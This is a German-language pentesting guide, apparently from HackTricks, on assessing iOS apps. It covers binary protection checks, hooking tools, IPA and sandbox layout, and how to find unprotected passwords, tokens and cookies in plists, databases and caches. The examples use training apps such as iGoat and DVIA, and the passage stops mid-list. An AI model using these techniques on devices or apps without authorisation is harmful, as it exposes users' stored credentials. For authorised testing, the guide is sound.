# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## iOS-Grundlagen

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Testumgebung

Auf dieser Seite finden Sie Informationen zum **iOS-Simulator**, zu **Emulatoren** und zum **Jailbreaking**:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Erste Analyse

### Grundlegende iOS-Testoperationen

W√§hrend des Tests werden **mehrere Operationen vorgeschlagen** (Verbindung zum Ger√§t herstellen, Dateien lesen/schreiben/hochladen/herunterladen, einige Tools verwenden...). Wenn Sie also nicht wissen, wie Sie eine dieser Aktionen ausf√ºhren k√∂nnen, **beginnen Sie mit dem Lesen der Seite**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
F√ºr die folgenden Schritte sollte die App auf dem Ger√§t installiert sein und die **IPA-Datei** der Anwendung bereits erhalten haben.\
Lesen Sie die Seite [Grundlegende iOS-Testoperationen](basic-ios-testing-operations.md), um zu erfahren, wie dies gemacht wird.
{% endhint %}

### Grundlegende statische Analyse

Es wird empfohlen, das Tool [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) zu verwenden, um eine automatische statische Analyse der IPA-Datei durchzuf√ºhren.

Identifizierung von **Schutzma√ünahmen, die in der Bin√§rdatei vorhanden sind**:

*   **PIE (Position Independent Executable)**: Wenn aktiviert, l√§dt die Anwendung bei jedem Start an eine zuf√§llige Speicheradresse, was es schwieriger macht, ihre anf√§ngliche Speicheradresse vorherzusagen.

```bash
otool -hv <app-binary> | grep PIE   # Es sollte die PIE-Flagge enthalten
```
*   **Stack Canaries**: Zur √úberpr√ºfung der Integrit√§t des Stacks wird vor dem Aufruf einer Funktion ein "Canary"-Wert auf den Stack gelegt und nach Beendigung der Funktion erneut √ºberpr√ºft.

```bash
otool -I -v <app-binary> | grep stack_chk   # Es sollte die Symbole: stack_chk_guard und stack_chk_fail enthalten
```
*   **ARC (Automatic Reference Counting)**: Zur Vermeidung g√§ngiger Speicherbesch√§digungsfehler

```bash
otool -I -v <app-binary> | grep objc_release   # Es sollte das Symbol _objc_release enthalten
```
*   **Verschl√ºsselte Bin√§rdatei**: Die Bin√§rdatei sollte verschl√ºsselt sein

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # Die cryptid sollte 1 sein
```

**Identifizierung von sensiblen/unsicheren Funktionen**

*   **Schwache Hashing-Algorithmen**

```bash
# Auf dem iOS-Ger√§t
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Auf Linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Unsichere Zufallsfunktionen**

```bash
# Auf dem iOS-Ger√§t
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Auf Linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Unsichere 'Malloc'-Funktion**

```bash
# Auf dem iOS-Ger√§t
otool -Iv <app> | grep -w "_malloc"

# Auf Linux
grep -iER "_malloc"
```
*   **Unsichere und verwundbare Funktionen**

```bash
# Auf dem iOS-Ger√§t
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Auf Linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Grundlegende dynamische Analyse

Schauen Sie sich die dynamische Analyse an, die [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) durchf√ºhrt. Sie m√ºssen durch die verschiedenen Ansichten navigieren und mit ihnen interagieren, aber es werden mehrere Klassen gehookt und andere Dinge durchgef√ºhrt, und es wird einen Bericht erstellen, wenn Sie fertig sind.

### Auflisten installierter Apps

Verwenden Sie den Befehl `frida-ps -Uai`, um den **Bundle-Identifier** der installierten Apps zu ermitteln:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Grundlegende Enumeration & Hooking

Erfahren Sie, wie Sie die Komponenten der Anwendung aufz√§hlen und Methoden und Klassen mit Objection einfach hooken k√∂nnen:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPA-Struktur

Die Struktur einer IPA-Datei entspricht im Wesentlichen der einer gepackten Datei. Durch Umbenennen der Erweiterung in `.zip` kann sie dekomprimiert werden, um ihren Inhalt anzuzeigen. Innerhalb dieser Struktur stellt ein Bundle eine vollst√§ndig verpackte Anwendung dar, die zur Installation bereit ist. Darin finden Sie ein Verzeichnis mit dem Namen `<NAME>.app`, das die Ressourcen der Anwendung enth√§lt.

* **`Info.plist`**: Diese Datei enth√§lt spezifische Konfigurationsdetails der Anwendung.
* **`_CodeSignature/`**: Dieses Verzeichnis enth√§lt eine plist-Datei, die eine Signatur enth√§lt und die Integrit√§t aller Dateien im Bundle gew√§hrleistet.
* **`Assets.car`**: Ein komprimiertes Archiv, das Asset-Dateien wie Icons speichert.
* **`Frameworks/`**: Dieser Ordner enth√§lt die nativen Bibliotheken der Anwendung, die in Form von `.dylib`- oder `.framework`-Dateien vorliegen k√∂nnen.
* **`PlugIns/`**: Dies kann Erweiterungen der Anwendung enthalten, die als `.appex`-Dateien bezeichnet werden, obwohl sie nicht immer vorhanden sind.
*¬†[**`Core Data`**](https://developer.apple.com/documentation/coredata): Es wird verwendet, um die dauerhaften Daten Ihrer Anwendung f√ºr die Offline-Nutzung zu speichern, tempor√§re Daten zu zwischenspeichern und Ihrer App auf einem einzelnen Ger√§t die M√∂glichkeit zum R√ºckg√§ngigmachen hinzuzuf√ºgen. Um Daten √ºber mehrere Ger√§te in einem einzigen iCloud-Konto zu synchronisieren, spiegelt Core Data Ihr Schema automatisch in einem CloudKit-Container wider.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Die `PkgInfo`-Datei ist eine alternative M√∂glichkeit, den Typ und die Erstellercodes Ihrer Anwendung oder Ihres Bundles anzugeben.
* **en.lproj, fr.proj, Base.lproj**: Dies sind die Sprachpakete, die Ressourcen f√ºr diese bestimmten Sprachen enthalten, sowie eine Standardressource f√ºr den Fall, dass eine Sprache nicht unterst√ºtzt wird.
* **Sicherheit**: Das Verzeichnis `_CodeSignature/` spielt eine wichtige Rolle bei der Sicherheit der App, indem es die Integrit√§t aller geb√ºndelten Dateien durch digitale Signaturen √ºberpr√ºft.
* **Asset-Verwaltung**: Die Datei `Assets.car` verwendet Kompression, um grafische Assets effizient zu verwalten, was f√ºr die Optimierung der Anwendungsleistung und die Reduzierung ihrer Gesamtgr√∂√üe entscheidend ist.
* **Frameworks und PlugIns**: Diese Verzeichnisse unterstreichen die Modularit√§t von iOS-Anwendungen und erm√∂glichen es Entwicklern, wiederverwendbare Codebibliotheken (`Frameworks/`) einzuschlie√üen und die Funktionalit√§t der App zu erweitern (`PlugIns/`).
* **Lokalisierung**: Die Struktur unterst√ºtzt mehrere Sprachen und erleichtert die weltweite Anwendungsbereitstellung durch Bereitstellung von Ressourcen f√ºr bestimmte Sprachpakete.

**Info.plist**

Die **Info.plist** dient als Grundlage f√ºr iOS-Anwendungen und enth√§lt wichtige Konfigurationsdaten in Form von Schl√ºssel-Wert-Paaren. Diese Datei ist nicht nur f√ºr Anwendungen, sondern auch f√ºr in Bundles enthaltene App-Erweiterungen und Frameworks erforderlich. Sie ist strukturiert entweder in XML oder einem bin√§ren Format und enth√§lt wichtige Informationen von App-Berechtigungen bis hin zu Sicherheitskonfigurationen. Eine detaillierte Erkundung der verf√ºgbaren Schl√ºssel kann in der [**Apple Developer-Dokumentation**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc) nachgeschlagen werden.

F√ºr diejenigen, die mit dieser Datei in einem zug√§nglicheren Format arbeiten m√∂chten, kann die XML-Konvertierung m√ºhelos mit Hilfe von `plutil` auf macOS (ab Version 10.2 nativ verf√ºgbar) oder `plistutil` auf Linux erreicht werden. Die Befehle zur Konvertierung lauten wie folgt:

- **F√ºr macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
- **F√ºr Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
Unter den vielen Informationen, die die Datei **Info.plist** preisgeben kann, sind bemerkenswerte Eintr√§ge unter anderem Berechtigungszeichenketten der App (`UsageDescription`), benutzerdefinierte URL-Schemas (`CFBundleURLTypes`) und Konfigurationen f√ºr die App Transport Security (`NSAppTransportSecurity`). Diese Eintr√§ge sowie andere wie exportierte/importierte benutzerdefinierte Dokumententypen (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`) k√∂nnen m√ºhelos durch Inspektion der Datei oder durch Verwendung eines einfachen `grep`-Befehls gefunden werden:
```bash
$ grep -i <keyword> Info.plist
```
**Datenpfade**

In der iOS-Umgebung werden Verzeichnisse speziell f√ºr **Systemanwendungen** und **benutzerinstallierte Anwendungen** festgelegt. Systemanwendungen befinden sich im Verzeichnis `/Applications`, w√§hrend benutzerinstallierte Apps unter `/private/var/containers/` platziert werden. Diese Anwendungen erhalten einen eindeutigen Bezeichner, der als **128-Bit-UUID** bekannt ist, was die manuelle Suche nach dem Ordner einer App aufgrund der Zuf√§lligkeit der Verzeichnisnamen erschwert.

Um die Entdeckung des Installationsverzeichnisses einer benutzerinstallierten App zu erleichtern, bietet das **objection-Tool** einen n√ºtzlichen Befehl namens `env`. Dieser Befehl zeigt detaillierte Verzeichnisinformationen f√ºr die betreffende App an. Im Folgenden finden Sie ein Beispiel, wie dieser Befehl verwendet wird:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternativ kann der App-Name mithilfe des `find`-Befehls in `/private/var/containers` gesucht werden:
```bash
find /private/var/containers -name "Progname*"
```
Befehle wie `ps` und `lsof` k√∂nnen ebenfalls verwendet werden, um den Prozess der App zu identifizieren und offene Dateien aufzulisten. Dadurch erhalten Sie Einblicke in die aktiven Verzeichnispfade der Anwendung:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Verzeichnis des B√ºndels:**

* **AppName.app**
* Dies ist das Anwendungs-Bundle, wie es zuvor in der IPA-Datei gesehen wurde. Es enth√§lt wesentliche Anwendungsdaten, statischen Inhalt sowie die kompilierte Bin√§rdatei der Anwendung.
* Dieses Verzeichnis ist f√ºr Benutzer sichtbar, aber **Benutzer k√∂nnen nicht darauf schreiben**.
* Der Inhalt dieses Verzeichnisses wird **nicht gesichert**.
* Der Inhalt dieses Ordners wird zur **Validierung der Codesignatur** verwendet.

**Datenverzeichnis:**

* **Documents/**
* Enth√§lt alle vom Benutzer generierten Daten. Die Erstellung dieser Daten wird vom Endbenutzer der Anwendung initiiert.
* Sichtbar f√ºr Benutzer und **Benutzer k√∂nnen darauf schreiben**.
* Der Inhalt dieses Verzeichnisses wird **gesichert**.
* Die App kann Pfade deaktivieren, indem sie `NSURLIsExcludedFromBackupKey` festlegt.
* **Library/**
* Enth√§lt alle **Dateien, die nicht benutzerspezifisch sind**, wie **Caches**, **Einstellungen**, **Cookies** und Konfigurationsdateien im Property List (plist)-Format.
* iOS-Apps verwenden normalerweise die Unterverzeichnisse `Application Support` und `Caches`, aber die App kann benutzerdefinierte Unterverzeichnisse erstellen.
* **Library/Caches/**
* Enth√§lt **halbpermanente zwischengespeicherte Dateien**.
* F√ºr Benutzer unsichtbar und **Benutzer k√∂nnen nicht darauf schreiben**.
* Der Inhalt dieses Verzeichnisses wird **nicht gesichert**.
* Das Betriebssystem kann die Dateien in diesem Verzeichnis automatisch l√∂schen, wenn die App nicht ausgef√ºhrt wird und der Speicherplatz knapp wird.
* **Library/Application Support/**
* Enth√§lt **persistente Dateien**, die f√ºr das Ausf√ºhren der App erforderlich sind.
* F√ºr Benutzer **unsichtbar** und Benutzer k√∂nnen nicht darauf schreiben.
* Der Inhalt dieses Verzeichnisses wird **gesichert**.
* Die App kann Pfade deaktivieren, indem sie `NSURLIsExcludedFromBackupKey` festlegt.
* **Library/Preferences/**
* Wird zum Speichern von Eigenschaften verwendet, die **auch nach dem Neustart einer Anwendung bestehen bleiben**.
* Informationen werden unverschl√ºsselt in der Anwendungssandbox in einer plist-Datei namens \[BUNDLE\_ID].plist gespeichert.
* Alle mit `NSUserDefaults` gespeicherten Schl√ºssel/Wert-Paare sind in dieser Datei zu finden.
* **tmp/**
* Verwenden Sie dieses Verzeichnis, um **tempor√§re Dateien** zu schreiben, die zwischen den App-Starts nicht bestehen bleiben m√ºssen.
* Enth√§lt nicht persistente zwischengespeicherte Dateien.
* F√ºr Benutzer **unsichtbar**.
* Der Inhalt dieses Verzeichnisses wird nicht gesichert.
* Das Betriebssystem kann die Dateien in diesem Verzeichnis automatisch l√∂schen, wenn die App nicht ausgef√ºhrt wird und der Speicherplatz knapp wird.

Werfen wir einen genaueren Blick auf das Anwendungs-Bundle (.app)-Verzeichnis von iGoat-Swift im Bundle-Verzeichnis (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Bin√§re Umkehrung

Im Ordner `<application-name>.app` finden Sie eine Bin√§rdatei namens `<application-name>`. Dies ist die Datei, die **ausgef√ºhrt** wird. Sie k√∂nnen eine grundlegende Inspektion der Bin√§rdatei mit dem Tool **`otool`** durchf√ºhren:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**√úberpr√ºfen Sie, ob die App verschl√ºsselt ist**

√úberpr√ºfen Sie, ob es eine Ausgabe f√ºr Folgendes gibt:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Disassemblieren der Bin√§rdatei**

Disassembliere den Textabschnitt:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Um das **Objective-C-Segment** der Beispielanwendung auszudrucken, kann man Folgendes verwenden:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Um einen kompakteren Objective-C-Code zu erhalten, k√∂nnen Sie [**class-dump**](http://stevenygard.com/projects/class-dump/) verwenden:
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Jedoch sind die besten Optionen, um die Bin√§rdatei zu disassemblieren: [**Hopper**](https://www.hopperapp.com/download.html?) und [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Datenspeicherung

Um zu erfahren, wie iOS Daten auf dem Ger√§t speichert, lesen Sie diese Seite:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Die folgenden Speicherorte f√ºr Informationen sollten **direkt nach der Installation der Anwendung**, **nach √úberpr√ºfung aller Funktionen** der Anwendung und sogar nach dem **Abmelden von einem Benutzer und Anmelden bei einem anderen** √ºberpr√ºft werden.\
Das Ziel besteht darin, **ungesch√ºtzte sensible Informationen** der Anwendung (Passw√∂rter, Tokens), des aktuellen Benutzers und der zuvor angemeldeten Benutzer zu finden.
{% endhint %}

### Plist

**plist**-Dateien sind strukturierte XML-Dateien, die **Schl√ºssel-Wert-Paare enthalten**. Es ist eine M√∂glichkeit, persistente Daten zu speichern, daher k√∂nnen manchmal **sensible Informationen in diesen Dateien gefunden werden**. Es wird empfohlen, diese Dateien nach der Installation der App und nach intensiver Nutzung zu √ºberpr√ºfen, um zu sehen, ob neue Daten geschrieben werden.

Der h√§ufigste Weg, Daten in plist-Dateien zu speichern, ist die Verwendung von **NSUserDefaults**. Diese plist-Datei wird im App-Sandbox unter **`Library/Preferences/<appBundleID>.plist`** gespeichert.

Die Klasse [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) bietet eine programmatische Schnittstelle zum Interagieren mit dem Standard-System. Das Standard-System erm√∂glicht es einer Anwendung, ihr Verhalten entsprechend den **Benutzereinstellungen** anzupassen. Von `NSUserDefaults` gespeicherte Daten k√∂nnen im Anwendungs-Bundle eingesehen werden. Diese Klasse speichert **Daten** in einer **plist**-**Datei**, ist jedoch f√ºr die Verwendung mit kleinen Datenmengen gedacht.

Diese Daten k√∂nnen nicht mehr direkt √ºber einen vertrauensw√ºrdigen Computer abgerufen werden, k√∂nnen jedoch durch Erstellen eines **Backups** abgerufen werden.

Sie k√∂nnen die gespeicherten Informationen mit Hilfe von objection's `ios nsuserdefaults get` abrufen.

Um alle plist-Dateien zu finden, die von der Anwendung verwendet werden, k√∂nnen Sie auf `/private/var/mobile/Containers/Data/Application/{APPID}` zugreifen und Folgendes ausf√ºhren:
```bash
find ./ -name "*.plist"
```
Um Dateien vom Format **XML oder bin√§r (bplist)** in XML umzuwandeln, stehen je nach Betriebssystem verschiedene Methoden zur Verf√ºgung:

**F√ºr macOS-Benutzer:**
Verwenden Sie den Befehl `plutil`. Es ist ein integriertes Tool in macOS (10.2+), das f√ºr diesen Zweck entwickelt wurde:
```bash
$ plutil -convert xml1 Info.plist
```
**F√ºr Linux-Benutzer:**
Installieren Sie zuerst `libplist-utils` und verwenden Sie dann `plistutil`, um Ihre Datei zu konvertieren:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Innerhalb einer Objection-Sitzung:**
Zur Analyse von mobilen Anwendungen gibt es einen speziellen Befehl, mit dem Sie Plist-Dateien direkt konvertieren k√∂nnen:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) ist ein Framework zur Verwaltung der Modellschicht von Objekten in Ihrer Anwendung. [Core Data kann SQLite als persistenten Speicher verwenden](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), ist jedoch selbst kein Datenbank-Framework.\
CoreData verschl√ºsselt seine Daten standardm√§√üig nicht. Es kann jedoch eine zus√§tzliche Verschl√ºsselungsebene zu CoreData hinzugef√ºgt werden. Weitere Details finden Sie im [GitHub-Repo](https://github.com/project-imas/encrypted-core-data).

Die SQLite Core Data-Informationen einer Anwendung finden Sie im Pfad `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Wenn Sie die SQLite √∂ffnen und auf sensible Informationen zugreifen k√∂nnen, haben Sie eine Fehlkonfiguration gefunden.**

{% code title="Code aus iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) ist ein Key/Value-Speicher, der auf SQLite aufbaut.\
Da die Yap-Datenbanken SQLite-Datenbanken sind, k√∂nnen Sie sie mithilfe des im vorherigen Abschnitt vorgeschlagenen Befehls finden.

### Andere SQLite-Datenbanken

Es ist √ºblich, dass Anwendungen ihre eigenen SQLite-Datenbanken erstellen. M√∂glicherweise speichern sie sensible Daten darin und lassen sie unverschl√ºsselt. Daher ist es immer interessant, jede Datenbank im Anwendungsverzeichnis zu √ºberpr√ºfen. Gehen Sie daher zum Anwendungsverzeichnis, in dem die Daten gespeichert sind (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Real-Time-Datenbanken

Entwickler k√∂nnen Daten in einer NoSQL-Cloud-Datenbank speichern und synchronisieren, indem sie Firebase Real-Time-Datenbanken verwenden. Die Daten werden im JSON-Format gespeichert und in Echtzeit mit allen verbundenen Clients synchronisiert.

Hier finden Sie Informationen dazu, wie Sie nach fehlerhaft konfigurierten Firebase-Datenbanken suchen k√∂nnen:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm-Datenbanken

[Realm Objective-C](https://realm.io/docs/objc/latest/) und [Realm Swift](https://realm.io/docs/swift/latest/) bieten eine leistungsstarke Alternative zur Datenspeicherung, die von Apple nicht bereitgestellt wird. Standardm√§√üig werden die Daten unverschl√ºsselt gespeichert, aber eine Verschl√ºsselung ist durch spezifische Konfiguration m√∂glich.

Die Datenbanken befinden sich unter: `/private/var/mobile/Containers/Data/Application/{APPID}`. Um auf diese Dateien zuzugreifen, k√∂nnen Befehle wie folgt verwendet werden:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Um diese Datenbankdateien anzuzeigen, wird das Tool [**Realm Studio**](https://github.com/realm/realm-studio) empfohlen.

Um eine Verschl√ºsselung in einer Realm-Datenbank zu implementieren, kann der folgende Code-Schnipsel verwendet werden:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite Datenbanken

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) wird als eine **leichte** und **eingebettete** Datenbank-Engine beschrieben, die dem **dokumentenorientierten** (NoSQL) Ansatz folgt. Entwickelt f√ºr **iOS** und **macOS**, bietet sie die M√∂glichkeit, Daten nahtlos zu synchronisieren.

Um potenzielle Couchbase-Datenbanken auf einem Ger√§t zu identifizieren, sollte das folgende Verzeichnis √ºberpr√ºft werden:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Cookies

iOS speichert die Cookies der Apps in der Datei **`Library/Cookies/cookies.binarycookies`** innerhalb des Ordners jeder App. Entwickler entscheiden sich jedoch manchmal daf√ºr, sie im **Schl√ºsselbund** zu speichern, da die genannte **Cookie-Datei in Backups zug√§nglich sein kann**.

Um die Cookies-Datei zu √ºberpr√ºfen, k√∂nnen Sie [**dieses Python-Skript**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) verwenden oder die Funktion **`ios cookies get`** von Objection nutzen.\
**Sie k√∂nnen Objection auch verwenden, um diese Dateien in ein JSON-Format zu konvertieren und die Daten zu √ºberpr√ºfen.**
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

Standardm√§√üig speichert NSURLSession Daten wie **HTTP-Anfragen und -Antworten in der Cache.db-Datenbank**. Diese Datenbank kann **sensible Daten** enthalten, wenn Tokens, Benutzernamen oder andere sensible Informationen zwischengespeichert wurden. Um die zwischengespeicherten Informationen zu finden, √∂ffnen Sie das Datenverzeichnis der App (`/var/mobile/Containers/Data/Application/<UUID>`) und gehen Sie zu `/Library/Caches/<Bundle Identifier>`. Der **WebKit-Cache wird ebenfalls in der Cache.db-Datei gespeichert**. **Objection** kann die Datenbank mit dem Befehl `sqlite connect Cache.db` √∂ffnen und damit interagieren, da es sich um eine **normale SQLite-Datenbank** handelt.

Es wird **empfohlen, das Zwischenspeichern dieser Daten zu deaktivieren**, da sie m√∂glicherweise sensible Informationen in der Anfrage oder Antwort enthalten. Die folgende Liste zeigt verschiedene M√∂glichkeiten, dies zu erreichen:

